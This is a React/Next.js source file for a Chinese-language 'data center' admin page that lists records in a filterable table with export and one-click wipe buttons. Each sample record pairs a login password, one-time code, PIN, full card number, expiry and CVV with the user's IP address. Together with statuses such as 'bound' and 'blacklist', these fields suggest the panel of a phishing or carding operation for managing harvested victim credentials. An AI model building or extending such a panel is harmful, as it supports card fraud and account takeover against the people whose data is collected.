"use client"

import { useState } from "react"
import Layout from "@/components/layout"
import { PageHeader } from "@/components/common/page-header"
import { SearchFilters } from "@/components/common/search-filters"
import { DataTable } from "@/components/ui/data-table"
import { StatusBadge } from "@/components/ui/status-badge"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { CreditCard, MoreVertical, Upload, Trash2, ListChecks } from "lucide-react"
import { useFilters } from "@/lib/hooks/use-filters"
import { usePagination } from "@/lib/hooks/use-pagination"
import { useSelection } from "@/lib/hooks/use-selection"
import type { DataEntry } from "@/lib/types"

const mockData: DataEntry[] = [
  {
    id: "1",
    userIdPrefix: "CA",
    userIdSuffix: "(A-4383)",
    userEmail: "family@buyzone.com",
    account: "user_account_1",
    password: "password123",
    otp: "123456",
    pin: "1234",
    name: "lin bei",
    avatarFallback: "LB",
    cardHolderName: "Lin Bei",
    cardNumber: "4111 1111 1111 1111",
    cardExpiry: "01/27",
    cardCvv: "666",
    cardType: "D",
    remarks: "首次入金",
    status: "待处理",
    ip: "38.109.112.6",
    createdAt: "2025-06-06 01:11:16",
  },
  {
    id: "2",
    userIdPrefix: "US",
    userIdSuffix: "(B-1234)",
    userEmail: "john.doe@example.com",
    account: "john_doe",
    password: "securepassword",
    otp: "654321",
    pin: "4321",
    name: "John Doe",
    avatarFallback: "JD",
    cardHolderName: "John Doe",
    cardNumber: "5555 2222 2222 2222",
    cardExpiry: "12/26",
    cardCvv: "123",
    cardType: "C",
    remarks: "大额交易",
    status: "已绑定",
    ip: "192.168.1.100",
    createdAt: "2025-06-05 10:30:00",
  },
]

export default function DataCenterPage() {
  const [searchTerm, setSearchTerm] = useState("")

  const filterFunctions = {
    status: (item: DataEntry, value: string) => item.status === value,
    search: (item: DataEntry, value: string) => 
      item.name.toLowerCase().includes(value.toLowerCase()) ||
      item.userEmail.toLowerCase().includes(value.toLowerCase()) ||
      item.userIdSuffix.toLowerCase().includes(value.toLowerCase()),
  }

  const { filteredData, setFilter, clearAllFilters } = useFilters({
    data: mockData,
    filterFunctions,
  })

  const pagination = usePagination({
    data: filteredData,
    itemsPerPage: 10,
  })

  const selection = useSelection(pagination.paginatedData)

  const statusOptions = [
    { label: "全部状态", value: "all" },
    { label: "待处理", value: "待处理" },
    { label: "已绑定", value: "已绑定" },
    { label: "已完成", value: "已完成" },
    { label: "垃圾桶", value: "垃圾桶" },
    { label: "黑名单", value: "黑名单" },
  ]

  const columns = [
    {
      key: 'userInfo',
      title: '用户ID',
      render: (_: any, record: DataEntry) => (
        <div className="flex items-center">
          <Badge
            variant="outline"
            className="mr-2 bg-purple-500/10 text-purple-400 border-purple-500/50 text-xs px-1.5 py-0.5"
          >
            {record.userIdPrefix}
          </Badge>
          <div>
            <div className="text-sm text-slate-300">{record.userIdSuffix}</div>
            <div className="text-xs text-slate-500">{record.userEmail}</div>
          </div>
        </div>
      ),
    },
    {
      key: 'name',
      title: '姓名',
      render: (_: any, record: DataEntry) => (
        <div className="flex items-center">
          <Avatar className="h-7 w-7 mr-2">
            <AvatarFallback className="bg-slate-700 text-xs">{record.avatarFallback}</AvatarFallback>
          </Avatar>
          <div>
            <div className="text-sm text-slate-300">{record.name}</div>
            <div className="text-xs text-slate-500">{record.userEmail.split("@")[1]}</div>
          </div>
        </div>
      ),
    },
    {
      key: 'cardInfo',
      title: '卡信息',
      render: (_: any, record: DataEntry) => (
        <div className="flex items-center space-x-1">
          <Badge variant="outline" className="bg-slate-700 border-slate-600 text-slate-300 text-xs px-1.5 py-0.5">
            <CreditCard className="h-3 w-3 mr-1 text-purple-400" />
            {record.cardType}
          </Badge>
          <span className="text-xs text-slate-300">{record.cardHolderName}</span>
          <span className="text-xs text-slate-400">{record.cardNumber}</span>
        </div>
      ),
    },
    {
      key: 'status',
      title: '状态',
      render: (value: string) => (
        <StatusBadge status={value === "待处理" ? "pending" : value === "已绑定" ? "active" : "success"}>
          {value}
        </StatusBadge>
      ),
    },
    {
      key: 'ip',
      title: 'IP',
    },
    {
      key: 'createdAt',
      title: '创建时间',
      render: (value: string) => (
        <span className="text-xs text-slate-400">{value}</span>
      ),
    },
    {
      key: 'actions',
      title: '操作',
      align: 'center' as const,
      render: (_: any, record: DataEntry) => (
        <DropdownMenu>
          <DropdownMenuTrigger asChild>
            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-slate-100 h-8 w-8">
              <MoreVertical className="h-4 w-4" />
            </Button>
          </DropdownMenuTrigger>
          <DropdownMenuContent align="end" className="bg-slate-800 border-slate-700 text-slate-100">
            <DropdownMenuItem className="hover:bg-slate-700">查看详情</DropdownMenuItem>
            <DropdownMenuItem className="hover:bg-slate-700">编辑</DropdownMenuItem>
            <DropdownMenuItem className="hover:bg-slate-700 text-red-400 hover:text-red-300">
              删除
            </DropdownMenuItem>
          </DropdownMenuContent>
        </DropdownMenu>
      ),
    },
  ]

  const handleSearch = (value: string) => {
    setSearchTerm(value)
    setFilter('search', value)
  }

  const handleReset = () => {
    setSearchTerm("")
    clearAllFilters()
    pagination.resetPagination()
  }

  return (
    <Layout>
      <PageHeader
        title="数据中心"
        description="查看和管理数据中心"
      >
        <div className="flex items-center gap-2">
          <Button variant="outline" className="bg-slate-700 border-slate-600 hover:bg-slate-600">
            <ListChecks className="h-4 w-4 mr-2" />
            批量操作
          </Button>
          <Button variant="outline" className="bg-slate-700 border-slate-600 hover:bg-slate-600">
            <Upload className="h-4 w-4 mr-2" />
            导出
          </Button>
          <Button variant="destructive" className="bg-red-700/80 hover:bg-red-700">
            <Trash2 className="h-4 w-4 mr-2" />
            一键清空
          </Button>
        </div>
      </PageHeader>

      <SearchFilters
        searchValue={searchTerm}
        onSearchChange={handleSearch}
        filters={[
          {
            key: 'status',
            label: '用户状态',
            value: 'all',
            options: statusOptions,
            onChange: (value) => setFilter('status', value === 'all' ? '' : value),
          },
        ]}
        onReset={handleReset}
      />

      <DataTable
        data={pagination.paginatedData}
        columns={columns}
        rowSelection={{
          selectedRowKeys: Array.from(selection.selectedIds),
          onChange: (keys) => {
            selection.clearSelection()
            keys.forEach(key => selection.toggleSelection(key))
          },
        }}
        pagination={{
          current: pagination.currentPage,
          pageSize: pagination.pageSize,
          total: pagination.totalItems,
          showSizeChanger: true,
          onChange: (page, pageSize) => {
            pagination.goToPage(page)
            pagination.setPageSize(pageSize)
          },
        }}
      />
    </Layout>
  )
}